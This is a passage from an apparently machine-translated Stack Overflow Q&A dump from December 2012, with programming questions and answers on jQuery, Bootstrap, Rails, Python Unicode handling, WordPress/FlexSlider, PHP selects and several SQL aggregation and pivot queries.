   $(document).keydown(function(e) {
     doStuff();
   });
});

// The function called on keydown does something
// and then unbinds the keydown event
function doStuff() {
   console.log("Doing stuff");
   // And unbind it...
    $(document).unbind('keydown');
} 
```

[http://jsfiddle.net/cbSRu/2/](http://jsfiddle.net/cbSRu/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T01:13:58.777

这就是我最终使用的，好处是它可以影响所有键或只是其中一些键添加循环：

```
var keys = {};
var keyPressed = {};
$(document).keydown(function (e){
    if(!keyPressed[e.which]) { keyPressed[e.which] = true; keys[e.which] = true; } // If you add disableKey(e.which) here all keys are listened only once
});
$(document).keyup(function (e){
    delete keys[e.which];
    delete keyPressed[e.which];
});
function disableKey(n) {
    delete keys[n];
}
// Adding this function enables you to disable keys individually (probably have something like this anyway to differenciate keys)
function doStuff() {
    if(keys[65]) { console.log('attack'); disableKey(65); } // Disable key 65
    if(keys[83]) { console.log('jump'); }
    setTimeout(function(){doStuff()},100);
}
doStuff();​ 
```

[http://jsfiddle.net/cbSRu/6/](http://jsfiddle.net/cbSRu/6/)

# python - 在 Python 中从 UTF-8 解析为 XML

> ID：13870744
> 
> 赞同：1
> 
> 时间：2012-12-14T00:05:15.557
> 
> 标签：python, list, utf-8, python-2.7, arabic

我是 Python 新手，我正在尝试编写一个 Python 脚本，它将文本文件（以特定格式编写）解析为 XML 文件。文本文件是用非欧洲语言编写的，以 UTF-8 编码（从右到左书写），仅此一项就给我带来了一些麻烦。

文本文件格式：

```
{number}"|"{number}"|" {text in UTF-8} 
```

一个例子是：

```
 1|2|حمد ހުރީ، عالم ތަކުގެ ވެރި اللَّه އަށެވެ 
```

最初的问题是，当从文本中读取时，单词的顺序在 Python 中被切换了。如果要阅读文本： 1|2| ABC DEF，Python 会将其显示为 1|2| DEF ABC 这显然是不正确的。

我正在使用`file = open("text.txt")`并运行`readlines()`它来获取文本。

为了解决这个错误，我尝试`split()`将单词分开并将它们放入列表中，然后根据需要重新排序，但在*这种*情况下，可能存在转换错误并且我收到垃圾字符。将此类 UTF-8 字符存储到 Python 列表中并检索它们存在问题；字符没有被保留。

如果这个列表处理错误得到修复，那么编写 XML 文件应该是小菜一碟。

编辑：如果有帮助，语言是 Dhivehi，字母表是 Thaana。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T06:57:51.323

Python 在内部只支持很差的 BIDI 渲染。也就是说，它没有完全实现[Unicode Bidirectional Algorithm](http://www.unicode.org/reports/tr9/)。

但是，除非您直接在 Python 中进行文本布局，否则这无关紧要。对于您所描述的项目（读取带有一些 BIDI 文本的文件并输出具有相同文本的另一个文件），Python 就可以了。这是因为文件中文本的顺序（输入和输出）将反映语义顺序，而不是文本应该出现在最终用户屏幕上的方向。如果您生成一个 XML 文件并使用支持 BIDI 的阅读器（如大多数 Web 浏览器）打开它，您应该会看到以正确顺序显示的文本。

供您参考，还有一些模块可以更好地支持 Python 的双向文本渲染。一个是[python-bidi](http://pypi.python.org/pypi/python-bidi)，它显然适用于大多数从右到左文本的语言，但还不能正确处理阿拉伯字母的形状。另一个是[pyfribidi是](http://pypi.python.org/pypi/pyfribidi/)[GNU fribidi](http://fribidi.org/)库的绑定，它显然只能在 Linux（可能还有其他类 Unix 操作系统）上轻松编译。我没有使用过这两个，所以我不能提供个人推荐。

# twitter-bootstrap - 如何更改引导插入符号的指向位置？

> ID：13870746
> 
> 赞同：1
> 
> 时间：2012-12-14T00:05:46.293
> 
> 标签：twitter-bootstrap, caret

在引导程序中，插入符号始终指向下方。我希望它在菜单关闭时指向右侧。见演示。

演示：http: [//jsfiddle.net/Maty2/](http://jsfiddle.net/Maty2/)

HTML

```
<div class="functionbox funtog"> <a class="btn dropdown-toggle fleft" data-toggle="collapse" data-target="#demo-1" href="#"><span class="caret"></span></a>
        <h3>Recent</h3>
      </div>
      <div id="demo-1" class="collapse in">
        <div class="whitebox">
          <div id="myprojs">Hide this</div>
    </div>
</div> 
```

​</p>

CSS

```
.whitebox { padding: 20px; border-top: 1px dotted #b3b3b3; border-left: 1px dotted #b3b3b3; color: #444; background-color: white; position: relative; } 
.functionbox .btn { border: 2px solid #888; background: none; padding: 4px; margin: 0; height: 10px; }
.functionbox .btn .caret { margin: 2px; border-top: 4px solid #888; }
.functionbox { position: relative; }
.functionbox h3 { font-size: 1.4em; border-bottom: 3px solid #F2F2F2; }
.functionbox h2 { font-size: 1.8em; border-bottom: 3px solid #F2F2F2; }
.dropdown-menu { mid-width: 250px; }
.funtog .fleft { float: left; border: none; margin: 10px 10px 0 0; }
.funtog h3 { border-bottom: 1px dotted #b3b3b3; } 
```

​JS

```
<script src="js/jquery.js"></script> 
<script src="js/bootstrap-dropdown.js"></script> 
<script src="js/bootstrap-button.js"></script> 
<script src="js/bootstrap-collapse.js"></script> 
```

我不确定我需要更改什么才能添加此功能。有人有建议吗？或者可能是一个解决方案？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T22:38:38.297

在与朋友讨论后，我们想出了添加这个类：

```
.btn.collapsed > .caret {border-left: 4px solid #888; border-right: 0; border-top: 4px solid transparent; border-bottom: 4px solid transparent;} 
```

尽管我们无法解决将 # 添加到 URL 末尾的问题。如果有人知道一个建议，那就太好了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-01-04T11:52:25.187

简单的：

```
<span class="dropup">
    <span class="caret"></span>
</span> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-25T11:10:21.893

1.  如果您的元素开始折叠，请确保显式添加该类

    ```
    <a class="btn dropdown-toggle fleft collapsed" data-toggle="collapse" data-target="#demo-1" href="#"><span class="caret"></span></a> 
    ```

2.  使用这个 CSS

    ```
    // open state - points up
    .functionbox .caret {
      border-top-width: 0;
      border-bottom-width: 5px;
      border-bottom-style: solid;
    }

    // collapsed state - points down
    .functionbox .collapsed .caret {
      border-top-width: 5px;
      border-bottom-width: 0;
    } 
    ```

# ruby-on-rails - Rails 如果存在则更新，否则使用 find_or_create_by 创建

> ID：13870750
> 
> 赞同：1
> 
> 时间：2012-12-14T00:06:14.297
> 
> 标签：ruby-on-rails, ruby-on-rails-3, postgresql

我正在尝试运行一种方法，如果存在（表 Hashtag 列标签）标签，它会将视图计数更新 1。否则它将创建一个默认视图计数为 0 且标签为 @hashtag 已清理的新行。

**哈希日志.rb**

```
def self.create_hashlog(hashtag)        #enters hashtag into the log table, without #. 
        @hashtag_scrubbed = hashtag
        # Hashlog.find_or_create_by_tag(@hashtag_scrubbed) 

        taglog = Hashlog.find_or_create_by_tag(@hashtag_scrubbed) do |t|
        t.count = 0
        end
        taglog.count += 1
        taglog.save!    
    end 
```

**错误**

```
Completed 500 Internal Server Error in 772ms

NoMethodError (undefined method `+' for nil:NilClass):
  app/models/hashlog.rb:24:in `create_hashlog'
  app/controllers/hashtags_controller.rb:32:in `create' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T01:19:44.350

如果您的查找失败（因为没有记录）并且您的创建失败（因为验证失败）该函数返回 nil。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T04:29:55.453

改变它来`find_or_initialize_by_tag`解决它 - stephenmurdoch

# c# - 将正则表达式转换为 htmlagilitypack

> ID：13870751
> 
> 赞同：2
> 
> 时间：2012-12-14T00:06:15.280
> 
> 标签：c#, regex, html-agility-pack

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:14:28.340

如果我理解正确，这可能会奏效。如果不是，请在预期文本的外观之前、中间、之后清楚地显示出来。

```
 var nodes = doc.DocumentNode.Descendants("#text").Where(text => Regex.IsMatch(text.InnerText.Trim(), @"≤[^≥]*≥"));
        string format =
            @"<div class=""wrapper"" contenteditable=""false""><span class=""wrapper2""><div class=""myClass"">{0}</div><button type="" button"" class=""MergeCodeRemoveIcon"">×</button></span></div>";

        foreach (var htmlNode in nodes)
        {
            htmlNode.InnerHtml = string.Format(CultureInfo.InvariantCulture, format, htmlNode.InnerText.Trim().Trim(new[] { '≤', '≥' }));
        }

        return doc.DocumentNode.OuterHtml; 
```

* * *

尝试这个：

```
 private static string transformFromMergeCodesToHtml(string textWithMergeCodes)
    {
        HtmlDocument doc = new HtmlDocument();
        doc.LoadHtml(textWithMergeCodes);

        var nodes = doc.DocumentNode.Descendants("#text").Where(text => Regex.IsMatch(text.InnerText.Trim(), @"≤[^≥]*≥"));
        string format =
            @"<div class=""wrapper"" contenteditable=""false""><span class=""wrapper2""><div class=""myClass"">$2</div><button type="" button"" class=""MergeCodeRemoveIcon"">×</button></span></div>";

        foreach (var htmlNode in nodes)
        {
            htmlNode.InnerHtml = Regex.Replace(htmlNode.InnerText.Trim(), @"(≤)([^≥]*)(≥)", format);
        }
        return doc.DocumentNode.OuterHtml;
    }

    private static string transformFromHtmlToMergeCodes(string text)
    {
        var doc = new HtmlDocument();
        doc.LoadHtml(text);
        var nodes = doc.DocumentNode.SelectNodes("//div[@class='wrapper']");
        foreach (var item in nodes)
        {
            var innerText = "≤" + item.SelectSingleNode("//div[@class='myClass']").InnerText.Trim() + "≥";
            var textNode = HtmlNode.CreateNode(innerText);
            item.ParentNode.ReplaceChild(textNode, item);
        }
        return doc.DocumentNode.InnerHtml;

    } 
```

注意：我也更新了另一种方法！

# c++ - 从 Scilab 迁移到 C++

> ID：13870752
> 
> 赞同：1
> 
> 时间：2012-12-14T00:06:23.740
> 
> 标签：c++, math, vector, matrix

我正在做一个需要执行各种数学运算的项目，这些运算是 scilab、matlab、octave 等语言原生的。所以我正在寻找一个支持C++和良好性能的好库（最好是开源库）。它应具有以下特点：

*   它应该支持向量数学（因此它应该允许您轻松定义向量和矩阵，以及它们之间的操作等）；
*   它应该允许您使用正态或均匀分布（一维和二维分布）生成随机数；
*   它应该允许舒适地执行其他操作，例如累积和、向量（即其所有元素）除以相同的值等。

我阅读了有关[Boost](http://www.boost.org/)的信息，但没有找到解释如何使用这些功能的示例：我正在寻找“面向 scilab 程序员的 Boost C++”之类的指南...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:29:08.380

[OpenCV](http://opencv.org/)支持矩阵和向量以及随机数生成器类。

[矩阵](http://docs.opencv.org/modules/core/doc/basic_structures.html#mat)类

[向量](http://docs.opencv.org/modules/core/doc/basic_structures.html#vec)类

[RNG](http://docs.opencv.org/modules/core/doc/operations_on_arrays.html#rng)类

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T00:27:16.047

`Eigen`是一个很好的矩阵和向量库，涵盖了第 1 点和第 3 点。至于第 2 点，有很多随机库。事实上，您也可以像这样轻松编写自己的代码：

[http://www.cplusplus.com/forum/beginner/7445/](http://www.cplusplus.com/forum/beginner/7445/)

希望这可以帮助。

PS。在此处链接到本征：

[http://eigen.tuxfamily.org/index.php?title=Main_Page](http://eigen.tuxfamily.org/index.php?title=Main_Page)

# jquery - jquery .html() 输出除 1 以外的所有元素

> ID：13870754
> 
> 赞同：0
> 
> 时间：2012-12-14T00:07:10.923
> 
> 标签：jquery, html, css-selectors

我正在尝试输出所有表行中的所有第一个 td，但`.html()`只输出第一个，而不是全部。

来自 jQuery 网站：

> *描述：获取匹配元素集中第一个元素的 HTML 内容。*

相关代码：

```
$("button").click(function() {
  var table1 = '<table><tr>';
  var data = $("#myTable tr:first-child").html();
  var table2 = '</tr></table>';
  var output = table1 + data + table2;
  $(".result").html(output);
}); 
```

当我将其更改为：

```
$("#myTable:first-child").html(); 
```

输出所有匹配的元素，所有 trs，而不仅仅是第一个。

如何输出所有第一个 td？这个*只有第一个匹配元素*的规则是什么意思？它似乎只适用于有时......

[http://jsfiddle.net/vaVe9/](http://jsfiddle.net/vaVe9/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:09:47.163

就是这样`.html()`工作的

你需要迭代`td`你想要的。

```
var data = '';
$("#myTable tr td:first-child").each(function(){
   data+= $(this).html();
}); 
```

但是您还需要记住，`.html()`它只带来所选元素的内部 HTML。

所以你需要将结果包装在`td`你自己

```
var data = '';
$("#myTable tr td:first-child").each(function(){
   data+= '<td>' + $(this).html() + '</td>';
}); 
```

* * *

该[文件](http://api.jquery.com/html/)指出

> 在一个 HTML 文档中，`.html()`可以用来获取任何元素的内容。***如果选择器表达式匹配多个元素，则只有第一个匹配项才会返回其 HTML 内容。***

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T00:22:32.913

这是做你想做的吗？

```
$("button").click(function() {
  var $table1 = $('<table><tr>')
  var $data = $("#myTable tr td:first-child");
    $.each($data, function () {
        $table1.append($(this));
    );
  $table1.append($('</tr></table>'));
  $(".result").append($table1);
}); 
```

# javascript - 在 IE 中使用 JavaScript 将 XML 加载到 DIV 中的问题

> ID：13870757
> 
> 赞同：1
> 
> 时间：2012-12-14T00:07:23.213
> 
> 标签：javascript, jquery, xml, load, internet-explorer-9

我需要将配置 XML 加载到 DIV 中，为此我使用以下代码：

```
 $(document).ready(function(){
                    console.log("Document ready");
        $("#footer_config").load("/config/footer_config.xml");
    }); 
```

这段代码在 Chrome 中运行正常，但在 IE 中不行。它在控制台中打印“文档准备就绪”，但“footer_config”DIV 为空。如果我在 IE 中按 CTRL+F5 它可以工作，并且 div 具有 XML 文件的内容。我正在使用 IE 9。

有任何想法吗？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:17:02.617

试试这个：

```
$(function(){
    console.log("Document ready");
    $("#footer_config").load('/config/footer_config.xml', function() {
        console.log('Load finished');
    });
}); 
```

这将告诉您加载已完成。之后尝试检查 Chrome 开发人员工具中的网络选项卡，看看它是否被拉下。

更新：

尝试使用 AJAX 方法将其拉下，而不是使用 load 方法：

```
$.ajax({url: '/config/footer_config.xml', dataType: 'xml', cache: false, success: function(d) {
    console.log(d);
    $('#footer_config').html($(d).html();
}}); 
```

# cocoa - 强制 NSOpenPanel 视图选项

> ID：13870768
> 
> 赞同：3
> 
> 时间：2012-12-14T00:08:37.940
> 
> 标签：cocoa, nsopenpanel

是否可以强制甚至限制 openPanel 的视图选项？例如，我希望 openPanel 在激活时仅显示封面流视图或图标视图。如果无法进行限制 - 如何设置默认视图？

谢谢。

-保罗。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-05T21:18:34.317

您可以通过委托使所有不可选择的文件透明`- (BOOL)panel:(id)sender shouldEnableURL:(NSURL *)url`

有更多的委托方法`NSOpenSavePanelDelegate`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-05T20:38:22.990

不幸的是，在 NSSavePanel 和 NSOpenPanel 中都没有这样的 API，您可能需要考虑在[http://bugreport.apple.com提交增强请求](http://bugreport.apple.com)

# wordpress - How do I grab my wordpress posts and get them to display inside FLEXSLIDER?

> ID：13870780
> 
> 赞同：2
> 
> 时间：2012-12-14T00:10:15.487
> 
> 标签：wordpress, web-applications, slider, flexslider

Hi I am a beginner to HTML/CSS/JS and I am trying to create a web app (FOR MOBILE ONLY) which grabs wordpress posts and inserts them into a slider like FLEXSLIDER. I want my users to be able to swipe through wordpress posts select one and once they have read it, SWIPE to the next post.

Can anybody help me?

How do I get individual WORDPRESS posts into FLEXSLIDER and integrate the slider with the WORDPRESS loop?

If you need more description please ask.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:41:06.173

Firstly, StackOverflow is intended to be used to help you with your code, not write your code for you. Given that you've never posted here before I'll give you the benefit of the doubt. In the future, please give us code examples of what you have tried and explicitly explain what the problem is.

As far as integrating your posts with Flexslider, that should be easy enough. I've not used the plugin before, but I'll give it a go based on the documentation on the Flexslider site. There are good instructions on how to use the plugin here: [http://www.woothemes.com/flexslider/](http://www.woothemes.com/flexslider/)

First, you'll need to make sure you have the necessary files linked inside of the`<head></head>` tags of your header.php file.

Place these lines in the document head, you may have to adjust the paths to target the files.

```
<link rel="stylesheet" href="flexslider.css" type="text/css">
<script src="jquery.flexslider.js"></script> 
```

Next you'll need to connect to the flexslider, place the code below in the head right after the two lines I just posted above

```
<script type="text/javascript" charset="utf-8">
  $(window).load(function() {
    $('.flexslider').flexslider({
        touch: true, // to allow for touch controls
    });
  });
</script> 
```

Then you'll need to integrate a loop with the slider markup. You need to place the below code in the template file for the page you wish to display the slider on.

```
<div class="flexslider">
<ul class="slides">

    <?php  
        $post_query = new WP_Query('post_type' => 'post');
        if($post_query->have_posts() ) : while($post_query->have_posts() ) : $post_query->the_post(); ?>

    <li>
        <?php the_title(); ?>
        <?php the_content(); ?>
    </li>

</ul>
</div>

<?php endwhile; ?>
<?php endif; ?> 
```

Without actually installing the plugin and only by going off of the documentation I think this will work. Let me know if you have any questions. If this gets the job done, please accept my answer.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:42:17.337

In your template file you would set up your markup with the class that gets used by Flexslider (in my case `.flexslider`) and insert your Wordpress Loop into that. Here's an example;

```
<div class="slider">
  <div id="slider" class="flexslider"> 
    <ul class="slides">
        <!-- THE POST LOOP -->
        <?php if ( have_posts() ) : while ( have_posts() ) : the_post(); ?>     

            <li>

                // Pull whatever you need from your posts here.  Featured images, content, excerpts. 
                // An image and then some absolutely positioned divs etc. The world;s you oyster

            </li>

        <?php endwhile; endif: ?>                   
    </ul>
</div> 
```

I'm assuming you have included the Flexslider scripts and CSS, so you would initiate Flexslider like so (in the header.php or footer.php or enqueue it in functions.php, whatever your favourite way of handling onload script is);

```
<script type="text/javascript">              
    jQuery(window).load(function() {
        jQuery('.flexslider').flexslider({
            animation: "slide", 
            direction: "vertical",
            easing: "easeOutExpo",
            animationSpeed: '400',
            controlNav: false 
    });
}); 
```

# php - 使用 php 进行选择

> ID：13870782
> 
> 赞同：0
> 
> 时间：2012-12-14T00:10:28.763
> 
> 标签：php, mysql

> **可能重复：**
> [如何使 <option selected="selected"> 由 MySql 和 PHP 设置？](https://stackoverflow.com/questions/2969762/how-to-make-option-selected-selected-set-by-mysql-and-php)

我在我的页面中进行了选择。此 Select 从数据库中提取选项。选择是：

```
<select name="name" id="name">
<?php
$pelatisquery="SELECT onoma_pelati FROM pelates_onoma";
$pelatisresult=mysql_query($pelatisquery) 
or die ("Query to get data from firsttable failed: ".mysql_error());
while ($pelatisorow=mysql_fetch_array($pelatisresult)) {
$onoma_pelati=$pelatisorow[onoma_pelati];
echo "<option>
$onoma_pelati
</option>";
}
?>
</select> 
```

此选择在我的主页中。因此，在“编辑”页面中，我想使用从数据库中选择的一个选项来检索此 Select。所以我的编辑页面是：

```
include_once "../../db_connection.php";
if (isset($_GET['id']) && is_numeric($_GET['id']) && $_GET['id'] > 0)
{
$id = $_GET['id'];
$result = mysql_query("SELECT id,pelatis FROM poliseis WHERE id=$id")
or die(mysql_error());
$row = mysql_fetch_array($result);
if($row)
{
$pelatis = $row['pelatis'];
}
} 
```

因此，如果 Select 有选项，我将使用以下代码：

```
<?php if($pelatis== "James") { echo 'selected = "selected"'; } ?> 
```

但是现在怎么弄`<option selected="selected">`？预先感谢您的回答

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:14:49.260

谷歌是你的朋友。

```
<option value="" selected="selected"></option>

<option value="" selected></option> //works too but less cross-browser friendly 
```

# mysql - 将 GROUP BY 和 ORDER BY 与多个 INNER JOINS 一起使用

> ID：13870783
> 
> 赞同：-1
> 
> 时间：2012-12-14T00:10:41.453
> 
> 标签：mysql, sql

我有一个包含多种内容类型和用户的数据库，以及一个带有点赞的单独数据库。我试图弄清楚哪些用户的*任何*内容获得了最多的喜欢，无论是什么类型。

我已经能够找出通过特定内容类型查找最喜欢的用户的查询，但事实证明，使用*任何*内容类型都比较困难。

值得注意的是，该数据库中有数百万条记录。

这是我在创建查询方面一直在做的工作......我很确定它不正确！

```
SELECT picture.user_id, video.creator_id, post.author_id
FROM likes_service.likes
INNER JOIN prod.pictures picture ON likes.obj_id = picture.id
INNER JOIN prod.videos video ON likes.obj_id = video.id
INNER JOIN prod.posts post ON likes.obj_id = post.id
GROUP BY picture.user_id, video.creator_id, post.author_id
ORDER BY COUNT(picture.user_id), COUNT(video.creator_id), COUNT(post.author_id) DESC
LIMIT 20; 
```

有人可以给我一个提示或指出我正确的方向吗？我觉得我越来越近了...

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:22:09.800

我认为您想要一个 UNION，而不是多路 JOIN。

```
select objects.user_id user_id, sum(likes.like_count) like_count
from (
    select user_id, id
    from prod.pictures
    union all
    select creator_id, id
    from prod.videos
    union all
    select author_id, id
    from prod.posts) objects
join (select obj_id, count(*) likes_count
      from likes_service.likes
      group by obj_id) likes on likes.obj_id = objects.id
group by user_id
order by like_count desc 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T00:46:49.340

目前尚不清楚您是否想要拥有列出最多喜欢的对象的用户，或者您是否正在寻找在其所有内容中拥有最多总体喜欢的用户。

考虑一个只有一张照片有 1000 个赞的用户，该用户是否应该排在拥有 100 张照片、视频和帖子的用户之前，平均点赞数为 20，点赞数最高为 50？

这是两个不同的查询。

现在，我将假设您要查找的是“最喜欢”的项目，然后查找这些对象中的每一个是由哪些用户创建/创作的。要找到 20 个“最喜欢”的项目，很容易找到哪些“ `obj_id`”最喜欢......

```
SELECT l.obj_id
     , COUNT(1) AS like_count
  FROM likes_service.likes l
 GROUP BY l.obj_id
ORDER BY like_count DESC
LIMIT 0,20 
```

我假设（基于您的原始查询），并且没有模式和示例数据，表中的值引用`obj_id`了其他表之一中单个对象的值......也就是说，一个值不会' t 出现在和表中。（否则，您可能会在旁边的某处有一列告诉您正在引用哪个表。）`likes``id``obj_id``photos``videos``obj_id``obj_id`

我们将之前的查询用作内联视图（MySQL 将其称为派生表），并给它一个方便的别名“ml”（最喜欢），我们将对每个目标对象表进行 LEFT JOIN（照片，视频，帖子），以找出它是什么类型的项目，以及用户/创建者/作者是谁。

```
SELECT ml.obj_id
     , ml.like_count
     , p.user_id
     , v.creator_id
     , t.author_id
  FROM ( SELECT l.obj_id
              , COUNT(1) AS like_count
           FROM likes_service.likes l
          GROUP BY l.obj_id
          ORDER BY like_count DESC
          LIMIT 0,20
       ) ml
  LEFT
  JOIN prod.pictures p
    ON p.id = ml.obj_id
  LEFT
  JOIN prod.videos v
    ON v.id = ml.obj_id
  LEFT
  JOIN prod.videos v
    ON v.id = ml.obj_id
  LEFT
  JOIN prod.posts t
    ON t.id = ml.obj_id
 ORDER BY ml.like_count DESC 
```

假设`user_id`照片表中的列不为空，`creator_id from the`视频表不为空...

然后，您可以确定 obj_id 是在哪个表中找到的。即如果该`user_id`列不为空，您知道它来自照片表，如果`creator_id`不为空，您知道它来自视频表。

您可以在最外面的选择中添加一些表达式来破译...

```
SELECT CASE WHEN p.user_id    IS NOT NULL THEN 'photo'
            WHEN v.creator_id IS NOT NULL THEN 'video'
            WHEN t.author_ID  IS NOT NULL THEN 'post'
       END AS obj_type
     , CASE WHEN p.user_id    IS NOT NULL THEN p.user_id
            WHEN v.creator_id IS NOT NULL THEN v.creator_id
            WHEN t.author_id  IS NOT NULL THEN t.author_id
       END AS user_id
     , l.obj_id 
```

# sql - SQL 查询以获取不同年份但具有对齐数据的零件总数

> ID：13870789
> 
> 赞同：1
> 
> 时间：2012-12-14T00:11:06.823
> 
> 标签：sql, sql-server, sql-server-2008, join

我有一个销售订单数据库，其中包含已售商品的条目。我想显示本年度和前两年销售的每个零件的总数。我当前的查询如下所示。（它正在搜索以“k”结尾的零件编号，这是我们数据库中一种特殊类型的零件。）

```
SELECT DISTINCT PRTNUM_28, sum(SHPQTY_28) AS TOTAL, PM.PMDES1_01
FROM   SO_Detail SOD
           JOIN PART_MASTER PM ON SOD.PRTNUM_28 = PM.PRTNUM_01
WHERE PRTNUM_28 LIKE '%k'
AND   SHPDTE_28 > '2011'
AND   SHPDTE_28 < '2012'
GROUP BY PRTNUM_28, PM.PMDES1_01
ORDER BY TOTAL DESC, PRTNUM_28 
```

上面的查询可以很好地显示 2012 年每个零件号的总数，但是我如何将前两年的数据也包含在相同的结果中？

请注意，对于每一年，零件编号可能存在​​也可能不存在 - 即 2011 年可能包含 2012 年或 2010 年未售出的零件，同样，2011 年可能不包含 2012 年和/或 2010 年售出的零件。我是不知道如何实现这个查询。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:20:56.243

假设你也想按年打破它，那么它可能是这样的：

```
SELECT LEFT(SHPDTE_28,4) As YR, PRTNUM_28, sum(SHPQTY_28) AS TOTAL, PM.PMDES1_01
FROM SO_Detail SOD
JOIN PART_MASTER PM ON SOD.PRTNUM_28 = PM.PRTNUM_01
WHERE PRTNUM_28 LIKE '%k'
AND SHPDTE_28 > '2009'
AND SHPDTE_28 < '2012'
GROUP BY LEFT(SHPDTE_28,4), PRTNUM_28, PM.PMDES1_01
ORDER BY TOTAL DESC, PRTNUM_28, YR 
```

虽然没有表定义，但我无法确定。

（另请注意，您通常不会将 DISTINCT 与 GROUP BY 一起用作其冗余。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T01:44:07.647

我不确定您使用的是什么 RDBMS，但您可以对其进行任何更改。该`DatePart`函数特定于 SQL Server。

但是，如果你想在单独的列中显示每一年的数据，那么你可以使用这样的东西，它基本上会旋转每一年的数据：

```
SELECT 
  PRTNUM_28, 
  sum(case when DatePart(yy, SHPDTE_28) = 2009 then SHPQTY_28 end) AS Total_2009, 
  sum(case when DatePart(yy, SHPDTE_28) = 2010 then SHPQTY_28 end) AS Total_2010, 
  sum(case when DatePart(yy, SHPDTE_28) = 2011 then SHPQTY_28 end) AS Total_2011, 
  sum(case when DatePart(yy, SHPDTE_28) = 2012 then SHPQTY_28 end) AS Total_2012,
  PM.PMDES1_01
FROM SO_Detail SOD
LEFT JOIN PART_MASTER PM 
  ON SOD.PRTNUM_28 = PM.PRTNUM_01
WHERE PRTNUM_28 LIKE '%k'
  AND SHPDTE_28 > '2009'
  AND SHPDTE_28 < '2012'
GROUP BY DatePart(yy, SHPDTE_28), PRTNUM_28, PM.PMDES1_01; 
```

或者，如果您有权访问某个`PIVOT`功能，您还可以使用以下内容：

```
select *
from
(
  SELECT DatePart(yy, SHPDTE_28) As YR, 
    PRTNUM_28, 
    SHPQTY_28,
    PM.PMDES1_01
  FROM SO_Detail SOD
  LEFT JOIN PART_MASTER PM 
    ON SOD.PRTNUM_28 = PM.PRTNUM_01
  WHERE PRTNUM_28 LIKE '%k'
    AND SHPDTE_28 > '2009'
    AND SHPDTE_28 < '2012'
) src
pivot
(
  sum(SHPQTY_28)
  for yr in ([2009], [2010], [2011], [2012])
) piv 
```

# sql - 在sql中使用范围进行列到行转换

> ID：13870793
> 
> 赞同：0
> 
> 时间：2012-12-14T00:11:20.523
> 
> 标签：sql, ms-access-2007

我有一张详细说明项目时间表的表格。

```
ProjectID | StartMonth | EndMonth
---------------------------------
1           2            5
2           3            8
3           6            10 
```

我想运行一个查询来为每个项目中的每个月生成一行。例如，ProjectID = 1，需要第 2 个月到第 5 个月的行。

```
ProjectID | Month
-----------------
1           2
1           3
1           4
1           5
2           3
2           4
2           5
2           6
2           7
2           8
3           6
3           7
3           8
3           9
3           10 
```

我正在使用 Access，但为了 StackOverflow 社区的利益，我想构建一个与平台无关的解决方案。

想到的唯一技术是双`for`循环，它将行与最内层循环中的每次迭代联合在一起。

有什么想法吗？

**更新/澄清**

StartMonth 和 EndMonth 是相对于儒略日期的整数值。例如，一个条目可能是：

```
ProjectID | StartMonth | EndMonth
---------------------------------
10          2            236 
```

这意味着系统从开始的第 2 个月到第 236 个月一直在监控项目。它仅记录第 2 个月至第 236 个月之间发生的事件。

尽管有好几个月没有发生任何事件，也没有发生任何事情。PM 希望有一个表，该表包含所有月份的行，并且在系统中没有记录任何活动的月份都为零。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T00:30:11.913

创建一个名为 Months 的表，在 Month 字段中使用数字 1-12。那么这是您的查询

```
SELECT  p.ProjectID
       ,m.Month
FROM   Months m
       INNER JOIN
       Projects p ON p.StartMonth<=m.Month AND p.EndMonth>=m.Month 
```

这种技术非常有用并且经常出现，以至于我有一个名为 IndexTable 的表，其中包含从 0 到 1,000,000 的整数。

顺便说一句 - 在我看来，你不会有任何跨越一年以上的项目。

# sql - 将excel行从更改命名范围转移到sql server db的最佳方法是什么？

> ID：13870798
> 
> 赞同：0
> 
> 时间：2012-12-14T00:12:58.133
> 
> 标签：sql, excel, ssis, onchange

我有一个与股票市场价格相关的动态 Excel 表。从这张表中的命名范围，我想触发任何行更改以将选定的列导出为数据库表中的新记录。

这对于要插入到数据库表中的大量 excel 行数据更改来说是无效的。

1.  什么是稳健可靠连接的最佳技术？
2.  有关更改行导出到 sql 的任何示例或教程？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T23:36:44.623

您可以采取多种方法。您可以设置一个作业来调用您的 SSIS 包，以每隔 X 分钟或几小时将电子表格导入到暂存数据库表中，然后再进入最终表。然后将使用应用 MERGE 命令的 SQL 任务执行导入和添加新信息或更新现有信息的过程，如下所示。在此示例中，Row1 字段是每条记录的唯一值（TestID 是数据库表 Tests 唯一的自动递增主键）。您还可以使用字段组合来唯一地定义每条记录。虽然您没有要求这样做，但最好包含一个历史表来跟踪更改并保持可追溯性。

```
MERGE dbo.Tests AS t
USING (SELECT Row1, Row2 FROM dbo.Tests_import) AS s
ON (t.Row1 = s.Row1)
WHEN NOT MATCHED THEN
    INSERT (Row1, Row2, DateCreated) VALUES(s.Row1, s.Row2, GETDATE())
WHEN MATCHED and s.Row2 <> t.Row2 THEN
    UPDATE SET t.Row2 = s.Row2, t.DateUpdated = GETDATE()
